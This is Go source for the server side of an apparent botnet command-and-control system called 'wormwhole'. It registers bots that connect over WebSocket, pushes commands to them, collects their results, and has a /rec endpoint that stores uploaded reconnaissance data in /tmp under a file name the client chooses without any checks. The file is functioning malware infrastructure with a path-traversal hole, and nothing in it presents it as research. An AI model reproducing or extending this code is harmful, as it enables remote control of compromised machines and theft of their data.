package server

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/xorium/wormwhole/core"
	"io/ioutil"
	"log"
	"net/http"
	"sync"
	"time"
)

func defaultBotEventHandler(b *Bot) {
	log.Println(b)
}

func defaultCommandRespHandler(c *core.Command, data []byte) {
	log.Println(c.ID, string(data))
}

type Bot struct {
	ID   string
	IP   string
	Conn *websocket.Conn
}

func (b *Bot) String() string {
	return fmt.Sprintf("%s|%s", b.ID, b.IP)
}

type CommandServer struct {
	*sync.RWMutex
	Debug           bool
	addr            string
	upgrader        websocket.Upgrader
	bots            map[string]*Bot
	currentCommands map[string]*core.Command

	onConnectHandler     func(*Bot)
	onDisconnectHandler  func(*Bot)
	onCommandRespHandler func(*core.Command, []byte)
}

func NewCommandServer(addr string) *CommandServer {
	return &CommandServer{
		RWMutex: new(sync.RWMutex),
		addr:    addr,
		upgrader: websocket.Upgrader{
			HandshakeTimeout: 5 * time.Second,
		},
		bots:            make(map[string]*Bot),
		currentCommands: make(map[string]*core.Command),

		onConnectHandler:     defaultBotEventHandler,
		onDisconnectHandler:  defaultBotEventHandler,
		onCommandRespHandler: defaultCommandRespHandler,
	}
}

func (s *CommandServer) SetOnConnect(h func(*Bot)) {
	s.Lock()
	s.onConnectHandler = h
	s.Unlock()
}

func (s *CommandServer) SetOnDisconnect(h func(*Bot)) {
	s.Lock()
	s.onDisconnectHandler = h
	s.Unlock()
}

func (s *CommandServer) SetOnCommandRespHandler(h func(*core.Command, []byte)) {
	s.Lock()
	s.onCommandRespHandler = h
	s.Unlock()
}

func (s *CommandServer) onDisconnect(bot *Bot) {
	s.Lock()
	delete(s.bots, bot.ID)
	s.Unlock()
	s.onDisconnectHandler(bot)
}

func (s *CommandServer) onConnect(bot *Bot) {
	s.onConnectHandler(bot)
}

func (s *CommandServer) removeBot(bot *Bot) {
	s.Lock()
	defer s.Unlock()
	delete(s.bots, bot.ID)

	for commandId, command := range s.currentCommands {
		if command.Target() == bot.ID {
			delete(s.currentCommands, commandId)
		}
	}
}

func (s *CommandServer) entrypoint(w http.ResponseWriter, r *http.Request) {
	c, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		if s.Debug {
			log.Println("upgrade ws connection error:", err)
		}
		return
	}

	query := r.URL.Query()
	botId := query.Get("uuid")
	if botId == "" {
		log.Println("connected bot with empty id")
		return
	}
	bot := &Bot{
		ID:   botId,
		IP:   r.RemoteAddr,
		Conn: c,
	}

	s.startHeartBeating(bot)

	if s.Debug {
		log.Println("bot connected: ", bot.String())
	}

	c.SetCloseHandler(func(code int, text string) error {
		s.onDisconnect(bot)
		return nil
	})

	s.Lock()
	s.bots[bot.ID] = bot
	s.Unlock()
	go s.onConnect(bot)
}

func (s *CommandServer) feedback(w http.ResponseWriter, r *http.Request) {
	defer func() { _, _ = w.Write([]byte("ok")) }()

	query := r.URL.Query()

	commandId := query.Get("cid")
	if commandId == "" {
		return
	}

	s.RLock()
	cmd, ok := s.currentCommands[commandId]
	s.RUnlock()
	if !ok {
		return
	}

	respCode := query.Get("code")
	if respCode == "" {
		respCode = core.CommandResultCodeSuccess
		cmd.SetState(core.CommandStateSuccess)
	}
	if respCode != core.CommandResultCodeSuccess {
		cmd.SetState(core.CommandStateFailed)
		if s.Debug {
			log.Printf("Command %s resp code: %s\n", commandId, respCode)
		}
	}

	respBody := make([]byte, 0)
	if r.Method == http.MethodPost {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("error while reading command %s resp: %v\n", commandId, err.Error())
		} else {
			respBody = body
		}
	}

	s.Lock()
	delete(s.currentCommands, cmd.ID)
	s.Unlock()
	go s.onCommandRespHandler(cmd, respBody)
}

func (s *CommandServer) reccon(w http.ResponseWriter, r *http.Request) {
	defer func() { _, _ = w.Write([]byte("ok")) }()

	query := r.URL.Query()
	dirName := query.Get("n")
	if dirName == "" {
		dirName = "unknown"
	}

	data := make([]byte, 0)
	if r.Method == http.MethodPost {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("error while reading reccon data: %v\n", err.Error())
		} else {
			data = body
		}
	}

	err := ioutil.WriteFile(fmt.Sprintf("/tmp/%s", dirName), data, 0644)
	if err != nil {
		log.Println("error while saving dirName data: ", err)
	}
}

func (s *CommandServer) SendCommand(c *core.Command, bot *Bot) error {
	s.RLock()
	bot, ok := s.bots[bot.ID]
	s.RUnlock()
	if !ok {
		return fmt.Errorf("command %s execution error: unknown bot ID %s", c.Name, bot.ID)
	}

	c.SetState(core.CommandStateExecuting)
	c.SetTarget(bot.ID)
	s.Lock()
	s.currentCommands[c.ID] = c
	s.Unlock()

	if err := bot.Conn.WriteJSON(c); err != nil {
		if s.Debug {
			log.Printf("can't send command %s to bot %s\n", c.Name, bot.String())
		}
		go s.onDisconnect(bot)
		s.removeBot(bot)
		delete(s.currentCommands, c.ID)
		return err
	}

	return nil
}

func (s *CommandServer) ListBots() []*Bot {
	s.RLock()
	defer s.RUnlock()
	bots := make([]*Bot, 0)
	for _, bot := range s.bots {
		bots = append(bots, bot)
	}
	return bots
}

func (s *CommandServer) ListCommands() []*core.Command {
	s.RLock()
	defer s.RUnlock()
	commands := make([]*core.Command, 0)
	for _, command := range s.currentCommands {
		commands = append(commands, command)
	}
	return commands
}

func (s *CommandServer) DeleteCommand(cmdId string) {
	s.Lock()
	delete(s.currentCommands, cmdId)
	s.Unlock()
}

func (s *CommandServer) startHeartBeating(bot *Bot) {
	go func() {
		ticker := time.NewTicker(time.Second)
		defer func() {
			ticker.Stop()
			_ = bot.Conn.Close()
		}()

		for range ticker.C {
			_ = bot.Conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			if err := bot.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				s.onDisconnect(bot)
				return
			}
		}
	}()
}

func (s *CommandServer) Run() {
	http.HandleFunc("/in", s.entrypoint)
	http.HandleFunc("/out", s.feedback)
	http.HandleFunc("/rec", s.reccon)
	log.Fatal(http.ListenAndServe(s.addr, nil))
}
